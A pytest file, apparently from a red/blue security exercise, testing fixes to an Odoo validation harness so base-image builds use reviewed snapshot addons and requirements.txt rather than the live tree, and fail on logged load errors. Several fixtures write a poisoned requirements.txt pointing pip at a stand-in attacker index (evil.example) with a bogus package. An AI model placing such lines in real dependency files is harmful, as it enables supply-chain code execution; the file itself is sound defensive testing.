"""BLUE fixes (ops-defense game #2, same seam) for two RED breaks in
templates/domain-packs/odoo/validation-harness/prepare-base-db.sh, PoC'd live.

Confirmed defects being closed here:

  DEFECT 1 (HIGH/LIVE): validate-full.sh's ODOO_DEMO_REBUILD=1 demo-data-
  revalidation path invoked `./prepare-base-db.sh "$PROJECT"` passing the raw,
  LIVE/mutable project path. prepare-base-db.sh unconditionally re-derived
  PROJECT_ADDONS="$PROJECT/custom-addons", so the base DB got rebuilt from the
  live working dir, NOT the immutable, already-materialized snapshot
  validate-full.sh built (HARNESS_SNAPSHOT_DIR, pinned to HARNESS_VALIDATE_REF)
  -- silently reintroducing the "validate the live dir, not the reviewed ref"
  TOCTOU/path class that RED17b-2/18/18b closed everywhere else. Deterministic
  under an overridden HARNESS_VALIDATE_REF; racy at defaults over the
  multi-minute rebuild window.

  Fix: prepare-base-db.sh now derives its addons dir as
  `PROJECT_ADDONS="${PREPARE_BASE_ADDONS_DIR:-$PROJECT/custom-addons}"` --
  default (no override) is byte-identical to the old behavior. validate-full.sh's
  ODOO_DEMO_REBUILD branch now passes
  `PREPARE_BASE_ADDONS_DIR="$PROJECT_ADDONS"` (the SAME HARNESS_SNAPSHOT_DIR/
  custom-addons it already materialized and validated against) into that call,
  so the base rebuild happens against the reviewed ref, not the live tree.

  DEFECT 2 (MEDIUM-HIGH/LATENT): prepare-base-db.sh's own
  `odoo-bin -i base` / `-i $MODS --stop-after-init` install step trusted `rc`
  alone. Its two siblings (validate-warm.sh, validate-full.sh) hedge the
  IDENTICAL "-i/-u ... --stop-after-init" invocation with a FAIL_RE log-grep
  backstop because rc can be 0 even on a failed load in edge configs (their
  own measured, documented behavior) -- prepare-base-db.sh had none, and zero
  test coverage.

  Fix: prepare-base-db.sh now captures the install step's combined output to a
  log and fails LOUD + non-zero if FAIL_RE matches, even when rc==0 -- reusing
  validate-full.sh's exact named FAIL_RE pattern and the identical
  tee/PIPESTATUS mechanism (`set +e; ... | tee "$LOG"; rc=${PIPESTATUS[0]};
  set -e; if [ "$rc" -ne 0 ] || grep -qiE "$FAIL_RE" "$LOG"; then ...`).

  DEFECT 3 (HIGH/LIVE, R8-red12 finding 1): prepare-base-db.sh sourced
  requirements.txt from the LIVE $PROJECT root, NOT the reviewed snapshot --
  even when called with PREPARE_BASE_ADDONS_DIR pointing at an already-
  materialized, ref-pinned snapshot (DEFECT 1's fix). requirements.txt content
  becomes `pip3 install -r` in the Dockerfile build of the SHARED base/
  base_demo image every later validate-warm/validate-full run reuses, so a
  live/uncommitted poison line (a malicious --index-url, a VCS/URL
  requirement, a poisoned pin) got build-time-executed even though it was
  never part of the reviewed ref -- same "validate live, not reviewed ref"
  class as DEFECT 1, one field over, with a worse blast radius (build-time
  RCE, not just a smuggled module).

  Fix: validate-warm.sh/validate-odoo.sh/validate-full.sh's (byte-identical)
  harness_materialize_tree() now ALSO materializes requirements.txt (if
  present at the ref) via the same filter-immune `git cat-file blob` path as
  custom-addons/**, as a SIBLING of the snapshot's custom-addons/ dir.
  prepare-base-db.sh derives `PREPARE_BASE_REQUIREMENTS` (default:
  `dirname(PROJECT_ADDONS)/requirements.txt`) and reads ONLY that path -- for
  the standalone/default caller this is byte-identical to the old
  "$PROJECT/requirements.txt"; for validate-full.sh's ODOO_DEMO_REBUILD caller
  (which already passes PREPARE_BASE_ADDONS_DIR="$PROJECT_ADDONS", the
  materialized snapshot) it resolves to the snapshot's own requirements.txt
  with NO further call-site change needed. A ref with no requirements.txt at
  all fails closed into the pre-existing manifest-derived branch (zero live
  bytes read), never a silent fall-back to the live file.

These tests are hermetic: `docker` is a small scripted fake binary on PATH
(never a real daemon, matching the pattern in
tests/test_odoo_warm_cache_provenance_defense2.py) that logs every invocation
and lets a test control the exit code AND stdout of the one subcommand
(`compose ... run ...`) standing in for the real odoo-bin install load.
prepare-base-db.sh's MODS discovery walks the addons dir directly via host
python3 (no docker needed for that part), so real module directories with
`__manifest__.py` files drive the addons-dir-selection assertions directly.

Non-vacuousness (PROJECT RULE: pin pre-fix behavior as an embedded literal,
never `git show HEAD` at test time): OLD_ADDONS_DERIVATION_SH and
OLD_INSTALL_CHECK_SH below are literal, self-contained reproductions of the
exact pre-fix logic for each defect (unconditional "$1/custom-addons"
derivation; rc-only pass/fail with no log-grep) -- not fetched from git
history. Each is driven through the same scenario used against the real,
fixed prepare-base-db.sh and shown to produce the OLD, broken outcome,
proving both defects were real and that the fixes are non-vacuous.
"""
from __future__ import annotations

import shutil
import stat
import subprocess
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
ODOO_PACK = ROOT / "templates" / "domain-packs" / "odoo"
HARNESS_SRC = ODOO_PACK / "validation-harness"

_HARNESS_FILES = [
    "prepare-base-db.sh",
    "validate-full.sh",
    "harness-preflight.sh",
    "harness-slug.sh",
    "harness-lock.sh",
    "docker-compose.validate.yml",
    "setup_company.py",
]


# --------------------------------------------------------------------------
# shared fixture helpers (mirrors tests/test_odoo_warm_cache_provenance_defense2.py
# / tests/test_odoo_harness_honesty_r2.py's established patterns)
# --------------------------------------------------------------------------
def _git(args: list[str], cwd: Path, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(["git", *args], cwd=cwd, text=True, capture_output=True, check=check)


def _init_repo(path: Path) -> None:
    path.mkdir(parents=True, exist_ok=True)
    _git(["init", "-q"], path)
    _git(["config", "user.email", "t@example.invalid"], path)
    _git(["config", "user.name", "T"], path)


def _commit_all(path: Path, message: str) -> str:
    _git(["add", "-A"], path)
    _git(["commit", "-q", "-m", message], path)
    return _git(["rev-parse", "HEAD"], path).stdout.strip()


def _make_executable(path: Path) -> None:
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def _copy_harness(tmp_path: Path, name: str = "harness") -> Path:
    harness = tmp_path / name
    harness.mkdir()
    for fname in _HARNESS_FILES:
        dst = harness / fname
        shutil.copy2(HARNESS_SRC / fname, dst)
        _make_executable(dst)
    return harness


def _make_module(root: Path, name: str, extra_files: dict[str, str] | None = None) -> None:
    mod = root / name
    mod.mkdir(parents=True, exist_ok=True)
    (mod / "__manifest__.py").write_text(
        f"{{'name': '{name}', 'depends': [], 'installable': True}}\n", encoding="utf-8"
    )
    for rel, content in (extra_files or {}).items():
        p = mod / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")


# A small, SCRIPTED fake `docker`: logs every invocation, answers preflight
# (version/info), the compose subcommands prepare-base-db.sh/validate-full.sh
# actually issue (build/up/exec/run), and lets a test control BOTH the exit
# code (FAKE_DOCKER_RUN_EXIT) and stdout (FAKE_DOCKER_RUN_OUTPUT) of the ONE
# subcommand ("compose ... run ...") that stands in for the real
# `odoo-bin -i ... --stop-after-init` install load -- exactly the seam DEFECT
# 2's FAIL_RE backstop reads.
_FAKE_DOCKER_SH = """#!/usr/bin/env bash
set -u
: "${DOCKER_CALL_LOG:?DOCKER_CALL_LOG not set}"
printf '%s\\n' "$*" >> "$DOCKER_CALL_LOG"

case "${1:-}" in
  version) echo "24.0.0"; exit 0 ;;
  info) exit 0 ;;
  rm) exit 0 ;;
esac

if [ "${1:-}" = "compose" ]; then
  shift
  if [ "${1:-}" = "-f" ]; then shift 2; fi
  verb="${1:-}"
  case "$verb" in
    build) exit 0 ;;
    up) exit 0 ;;
    exec)
      rest="$*"
      case "$rest" in
        *psql*) printf 'base                                                            | odoo     | UTF8     |\\nbase_demo                                                       | odoo     | UTF8     |\\n'; exit 0 ;;
        *) exit 0 ;;
      esac
      ;;
    run)
      if [ -n "${FAKE_DOCKER_RUN_OUTPUT:-}" ]; then printf '%s\\n' "$FAKE_DOCKER_RUN_OUTPUT"; fi
      exit "${FAKE_DOCKER_RUN_EXIT:-0}"
      ;;
    *) exit 0 ;;
  esac
fi
exit 0
"""


def _fake_docker_bin(tmp_path: Path, log_path: Path) -> Path:
    bin_dir = tmp_path / "fakebin"
    bin_dir.mkdir(exist_ok=True)
    docker = bin_dir / "docker"
    docker.write_text(_FAKE_DOCKER_SH, encoding="utf-8")
    _make_executable(docker)
    log_path.write_text("", encoding="utf-8")
    return bin_dir


def _base_env(fake_bin: Path, docker_log: Path, extra: dict | None = None) -> dict:
    import os

    env = os.environ.copy()
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"
    env["DOCKER_CALL_LOG"] = str(docker_log)
    for k in (
        "FAKE_DOCKER_RUN_EXIT", "FAKE_DOCKER_RUN_OUTPUT", "PREPARE_BASE_ADDONS_DIR",
        "PREPARE_BASE_REQUIREMENTS",
    ):
        env.pop(k, None)
    if extra:
        env.update(extra)
    return env


def _run_prepare_base_db(
    project: Path, harness: Path, env: dict
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["bash", str(harness / "prepare-base-db.sh"), str(project)],
        cwd=harness,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )


# ==========================================================================
# DEFECT 1 -- PREPARE_BASE_ADDONS_DIR override: prepare-base-db.sh must build
# from an EXPLICIT addons dir when given one, not always $PROJECT/custom-addons.
# ==========================================================================
def test_prepare_base_db_default_uses_project_custom_addons(tmp_path):
    """Regression: no override -> unchanged default behavior."""
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {"HARNESS_LOCK_FILE": str(tmp_path / "lock")})

    result = _run_prepare_base_db(project, harness, env)

    assert result.returncode == 0, result.stdout
    assert "full module set: mod1" in result.stdout, result.stdout
    assert "'base' ready" in result.stdout, result.stdout


def test_prepare_base_db_override_builds_from_snapshot_not_live(tmp_path):
    """DEFECT 1 core proof: a LIVE project whose custom-addons contains a
    poison module (present ONLY in the live/mutable tree, never reviewed)
    must NOT leak into the base build when PREPARE_BASE_ADDONS_DIR points at
    a separate, clean snapshot dir -- simulating validate-full.sh's already-
    materialized HARNESS_SNAPSHOT_DIR/custom-addons."""
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    _make_module(project / "custom-addons", "poison_mod")  # live-only, never reviewed

    snapshot_addons = tmp_path / "snapshot" / "custom-addons"
    _make_module(snapshot_addons, "mod1")  # the reviewed/committed module set only

    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {
        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
        "PREPARE_BASE_ADDONS_DIR": str(snapshot_addons),
    })

    result = _run_prepare_base_db(project, harness, env)

    assert result.returncode == 0, result.stdout
    assert "full module set: mod1" in result.stdout, result.stdout
    assert "poison_mod" not in result.stdout, (
        "the LIVE project's poison_mod leaked into the base build despite "
        f"PREPARE_BASE_ADDONS_DIR pointing at a clean snapshot. stdout:\n{result.stdout}"
    )


# Non-vacuousness control for DEFECT 1: the exact pre-fix derivation, embedded
# literally (never fetched from git history).
OLD_ADDONS_DERIVATION_SH = """#!/usr/bin/env bash
set -euo pipefail
PROJECT="$1"
PROJECT_ADDONS="$PROJECT/custom-addons"
ls "$PROJECT_ADDONS"
"""


def test_old_addons_derivation_would_have_used_the_live_poisoned_dir(tmp_path):
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    _make_module(project / "custom-addons", "poison_mod")

    old_script = tmp_path / "old_addons_derivation.sh"
    old_script.write_text(OLD_ADDONS_DERIVATION_SH, encoding="utf-8")
    old_script.chmod(old_script.stat().st_mode | stat.S_IXUSR)

    # Even with an (ignored, because the old logic never reads it) override env
    # set, the pre-fix unconditional "$1/custom-addons" derivation still picks
    # up the live tree's poison_mod -- proving the bug this diff closes was real.
    env = {"PREPARE_BASE_ADDONS_DIR": str(tmp_path / "snapshot" / "custom-addons")}
    result = subprocess.run(
        ["bash", str(old_script), str(project)],
        env=env, text=True, capture_output=True, check=False,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    assert "poison_mod" in result.stdout, (
        "the embedded pre-fix logic no longer reproduces the live-dir leak -- "
        "this control is no longer discriminating"
    )


# ==========================================================================
# DEFECT 1 (integration) -- validate-full.sh's ODOO_DEMO_REBUILD path must
# hand prepare-base-db.sh the ALREADY-MATERIALIZED snapshot dir, not the raw
# live $PROJECT path. Driven with a stub prepare-base-db.sh that records what
# it was handed (the real prepare-base-db.sh's own PREPARE_BASE_ADDONS_DIR
# handling is separately proven above).
# ==========================================================================
_STUB_PREPARE_BASE_DB_SH = """#!/usr/bin/env bash
set -u
: "${STUB_LOG:?STUB_LOG not set}"
{
  echo "ARGV: $*"
  echo "PREPARE_BASE_ADDONS_DIR=${PREPARE_BASE_ADDONS_DIR:-<unset>}"
  if [ -n "${PREPARE_BASE_ADDONS_DIR:-}" ] && [ -d "${PREPARE_BASE_ADDONS_DIR}" ]; then
    echo "ADDONS_DIR_CONTENTS:"
    ls "${PREPARE_BASE_ADDONS_DIR}"
  fi
} >> "$STUB_LOG"
exit 0
"""


def test_validate_full_demo_rebuild_hands_prepare_base_db_the_snapshot_dir(tmp_path):
    project = tmp_path / "project"
    _init_repo(project)
    _make_module(
        project / "custom-addons", "mod1",
        {"demo/mod1_demo.xml": "<odoo><data></data></odoo>\n"},
    )
    _commit_all(project, "base (mod1, no demo change yet)")

    # A demo/ file change (uncommitted, so it's what git diff HEAD sees) triggers
    # WANT_DEMO/DEMO_FILES_CHANGED=1 in validate-full.sh's git-diff-mode scoping.
    (project / "custom-addons" / "mod1" / "demo" / "mod1_demo.xml").write_text(
        "<odoo><data>changed</data></odoo>\n", encoding="utf-8"
    )
    # A poison module added ONLY to the live tree, uncommitted -- absent from the
    # HEAD snapshot validate-full.sh materializes (default HARNESS_VALIDATE_REF=HEAD).
    _make_module(project / "custom-addons", "poison_mod")

    harness = _copy_harness(tmp_path)
    stub = harness / "prepare-base-db.sh"
    stub.write_text(_STUB_PREPARE_BASE_DB_SH, encoding="utf-8")
    _make_executable(stub)

    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    stub_log = tmp_path / "stub.log"
    stub_log.write_text("", encoding="utf-8")

    env = _base_env(fake_bin, docker_log, {
        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
        "STUB_LOG": str(stub_log),
        "SKIP_TEST_PASS": "1",       # isolate to the demo-rebuild path only
        "ODOO_DEMO_REBUILD": "1",
    })

    result = subprocess.run(
        ["bash", str(harness / "validate-full.sh"), str(project)],
        cwd=harness,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )

    assert result.returncode == 0, result.stdout
    assert "demo-pass(rebuild) PASS" in result.stdout, result.stdout

    stub_calls = stub_log.read_text(encoding="utf-8")
    assert "PREPARE_BASE_ADDONS_DIR=<unset>" not in stub_calls, (
        f"validate-full.sh invoked prepare-base-db.sh WITHOUT PREPARE_BASE_ADDONS_DIR "
        f"-- the wiring fix is missing. stub log:\n{stub_calls}"
    )
    assert str(project / "custom-addons") not in stub_calls, (
        "validate-full.sh's ODOO_DEMO_REBUILD path handed prepare-base-db.sh the "
        f"raw project path instead of a materialized snapshot dir. stub log:\n{stub_calls}"
    )
    # The snapshot dir handed over reflects the COMMITTED (HEAD) tree only: it
    # must contain mod1 but NOT poison_mod (uncommitted, live-only).
    assert "mod1" in stub_calls, stub_calls
    assert "poison_mod" not in stub_calls, (
        "the live tree's uncommitted poison_mod leaked into what validate-full.sh "
        f"handed prepare-base-db.sh. stub log:\n{stub_calls}"
    )


# ==========================================================================
# DEFECT 2 -- prepare-base-db.sh's install step must not trust rc==0 alone;
# a FAIL_RE hit in the log must fail it LOUD and non-zero.
# ==========================================================================
def test_prepare_base_db_fails_on_fail_re_marker_despite_rc0(tmp_path):
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {
        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
        "FAKE_DOCKER_RUN_EXIT": "0",   # rc==0 ...
        "FAKE_DOCKER_RUN_OUTPUT": "Failed to load registry for mod1",  # ... but a FAIL_RE hit
    })

    result = _run_prepare_base_db(project, harness, env)

    assert result.returncode != 0, (
        "prepare-base-db.sh PASSED despite a FAIL_RE marker in the install log "
        f"(rc was 0) -- the log-grep backstop is missing. stdout:\n{result.stdout}"
    )
    assert "[base] FAIL" in result.stdout, result.stdout
    assert "'base' ready" not in result.stdout, result.stdout


def test_prepare_base_db_clean_run_still_succeeds(tmp_path):
    """Regression: rc0, no FAIL_RE content -> unchanged, still a clean PASS."""
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {
        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
        "FAKE_DOCKER_RUN_EXIT": "0",
        "FAKE_DOCKER_RUN_OUTPUT": "odoo.modules.loading: Modules loaded.",
    })

    result = _run_prepare_base_db(project, harness, env)

    assert result.returncode == 0, result.stdout
    assert "'base' ready" in result.stdout, result.stdout


# Non-vacuousness control for DEFECT 2: the exact pre-fix rc-only check,
# embedded literally (never fetched from git history).
OLD_INSTALL_CHECK_SH = """#!/usr/bin/env bash
set -euo pipefail
RC="$1"
if [ "$RC" -ne 0 ]; then
  echo "[base] FAIL (rc=$RC)"
  exit 1
fi
echo "[base] 'base' ready."
exit 0
"""


def test_old_install_check_would_have_passed_on_a_fail_re_log_with_rc0(tmp_path):
    old_script = tmp_path / "old_install_check.sh"
    old_script.write_text(OLD_INSTALL_CHECK_SH, encoding="utf-8")
    old_script.chmod(old_script.stat().st_mode | stat.S_IXUSR)

    # Same scenario as the fixed-script test above: rc==0 but the (never-
    # inspected, by the old logic) log contains a FAIL_RE marker.
    result = subprocess.run(
        ["bash", str(old_script), "0"],
        text=True, capture_output=True, check=False,
    )
    assert result.returncode == 0, (
        "the embedded pre-fix rc-only check no longer PASSES on rc=0 -- this "
        "control is no longer discriminating"
    )
    assert "'base' ready" in result.stdout, result.stdout


# ==========================================================================
# DEFECT 3 (AUD-RCE1) -- requirements.txt must come from the REVIEWED ref
# (never the live $PROJECT/requirements.txt) on any ref-scoped rebuild path.
# ==========================================================================
def test_validate_full_demo_rebuild_deps_come_from_reviewed_ref_not_live_poison(tmp_path):
    """AUD-RCE1 core proof, full pipe: validate-full.sh's ODOO_DEMO_REBUILD path
    materializes the REVIEWED (HEAD) ref's custom-addons AND requirements.txt into a
    snapshot, then hands prepare-base-db.sh PREPARE_BASE_ADDONS_DIR pointing at it (no
    other override). The LIVE, uncommitted requirements.txt differs from HEAD's and
    carries a poison line (a malicious --index-url + a bogus pinned package) -- it must
    NEVER reach the deps file that becomes `pip3 install -r`, only the REVIEWED content
    may."""
    project = tmp_path / "project"
    _init_repo(project)
    _make_module(
        project / "custom-addons", "mod1",
        {"demo/mod1_demo.xml": "<odoo><data></data></odoo>\n"},
    )
    (project / "requirements.txt").write_text("cleanpkg==1.0\n", encoding="utf-8")
    _commit_all(project, "base (mod1 + clean, reviewed requirements.txt)")

    # Uncommitted, LIVE-only changes: a demo/ edit (triggers the rebuild path) AND a
    # poisoned requirements.txt that differs from the committed (reviewed) one.
    (project / "custom-addons" / "mod1" / "demo" / "mod1_demo.xml").write_text(
        "<odoo><data>changed</data></odoo>\n", encoding="utf-8"
    )
    (project / "requirements.txt").write_text(
        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
    )

    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {
        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
        "SKIP_TEST_PASS": "1",       # isolate to the demo-rebuild path only
        "ODOO_DEMO_REBUILD": "1",
    })

    result = subprocess.run(
        ["bash", str(harness / "validate-full.sh"), str(project)],
        cwd=harness,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )

    assert result.returncode == 0, result.stdout
    assert "demo-pass(rebuild) PASS" in result.stdout, result.stdout

    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
    assert "evilpkg" not in deps, f"live poison leaked into .deps.txt:\n{deps}"
    assert "evil.example" not in deps, (
        f"live poison --index-url leaked into .deps.txt:\n{deps}"
    )
    assert "cleanpkg" in deps, (
        f"the REVIEWED ref's requirements.txt did not flow to .deps.txt:\n{deps}"
    )
    assert str(project / "requirements.txt") not in result.stdout, (
        "prepare-base-db.sh reported reading the LIVE $PROJECT/requirements.txt during a "
        f"ref-scoped rebuild. stdout:\n{result.stdout}"
    )


def test_prepare_base_db_ref_with_no_requirements_txt_fails_closed_never_live(tmp_path):
    """AUD-RCE1 fail-closed proof: PREPARE_BASE_ADDONS_DIR points at a snapshot whose
    root has NO requirements.txt (a reviewed ref that genuinely carries none), while the
    LIVE project root has one, and it is poisoned. The build must NEVER read the live
    file -- it falls back to the manifest-derived (here: empty) deps, exactly the safe
    state a project that has simply never had a requirements.txt is already in. This is
    the deliberate choice over a LOUD refusal: an absent requirements.txt at the ref is
    indistinguishable from, and exactly as safe as, "this project never needed one" --
    the pre-existing default behavior for every caller before this fix."""
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    (project / "requirements.txt").write_text(
        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
    )

    snapshot_addons = tmp_path / "snapshot" / "custom-addons"
    _make_module(snapshot_addons, "mod1")
    # Deliberately NO snapshot/requirements.txt -- the reviewed ref/snapshot has none.

    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {
        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
        "PREPARE_BASE_ADDONS_DIR": str(snapshot_addons),
    })

    result = _run_prepare_base_db(project, harness, env)

    assert result.returncode == 0, result.stdout
    assert "'base' ready" in result.stdout, result.stdout
    assert "deps source: custom-addons manifests" in result.stdout, result.stdout
    assert str(project / "requirements.txt") not in result.stdout, (
        "prepare-base-db.sh referenced the LIVE requirements.txt despite the reviewed "
        f"ref/snapshot having none. stdout:\n{result.stdout}"
    )

    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
    assert "evilpkg" not in deps and "evil.example" not in deps, (
        "the live poisoned requirements.txt leaked into .deps.txt despite the reviewed "
        f"ref having no requirements.txt. .deps.txt:\n{deps}"
    )


def test_prepare_base_db_default_still_reads_project_requirements_txt(tmp_path):
    """Regression: a standalone/direct invocation (no PREPARE_BASE_ADDONS_DIR /
    PREPARE_BASE_REQUIREMENTS override) must still read $PROJECT/requirements.txt
    exactly as before the AUD-RCE1 fix, and a clean, matching requirements.txt still
    builds."""
    project = tmp_path / "project"
    _make_module(project / "custom-addons", "mod1")
    (project / "requirements.txt").write_text("cleanpkg==1.0\n", encoding="utf-8")

    harness = _copy_harness(tmp_path)
    docker_log = tmp_path / "docker.log"
    fake_bin = _fake_docker_bin(tmp_path, docker_log)
    env = _base_env(fake_bin, docker_log, {"HARNESS_LOCK_FILE": str(tmp_path / "lock")})

    result = _run_prepare_base_db(project, harness, env)

    assert result.returncode == 0, result.stdout
    assert "'base' ready" in result.stdout, result.stdout
    assert (
        f"deps source: {project / 'requirements.txt'} (odoo.sh parity)" in result.stdout
    ), result.stdout

    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
    assert "cleanpkg" in deps, deps


# Non-vacuousness control for DEFECT 3: the exact pre-fix deps derivation, embedded
# literally (never fetched from git history) -- unconditional "$PROJECT/requirements.txt"
# with no snapshot/reviewed-ref override of any kind.
OLD_DEPS_DERIVATION_SH = """#!/usr/bin/env bash
set -euo pipefail
PROJECT="$1"
HERE="$2"
if [ -f "$PROJECT/requirements.txt" ]; then
  tr -d '\\r' < "$PROJECT/requirements.txt" | grep -vE '^[[:space:]]*(#|$)' > "$HERE/.deps.txt" || true
  echo "[base] deps source: $PROJECT/requirements.txt (odoo.sh parity)"
else
  : > "$HERE/.deps.txt"
  echo "[base] deps source: custom-addons manifests (no root requirements.txt)"
fi
"""


def test_old_deps_derivation_would_have_used_the_live_poisoned_requirements(tmp_path):
    project = tmp_path / "project"
    project.mkdir(parents=True, exist_ok=True)
    (project / "requirements.txt").write_text(
        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
    )
    here = tmp_path / "harness_old"
    here.mkdir()

    old_script = tmp_path / "old_deps_derivation.sh"
    old_script.write_text(OLD_DEPS_DERIVATION_SH, encoding="utf-8")
    old_script.chmod(old_script.stat().st_mode | stat.S_IXUSR)

    # Even with no override available in the old logic at all (it never looked for one),
    # the pre-fix unconditional "$PROJECT/requirements.txt" read still picks up the live,
    # poisoned file -- proving DEFECT (AUD-RCE1) was real.
    result = subprocess.run(
        ["bash", str(old_script), str(project), str(here)],
        text=True, capture_output=True, check=False,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    deps = (here / ".deps.txt").read_text(encoding="utf-8")
    assert "evilpkg" in deps and "evil.example" in deps, (
        "the embedded pre-fix logic no longer reproduces the live-requirements.txt leak "
        f"-- this control is no longer discriminating. .deps.txt:\n{deps}"
    )
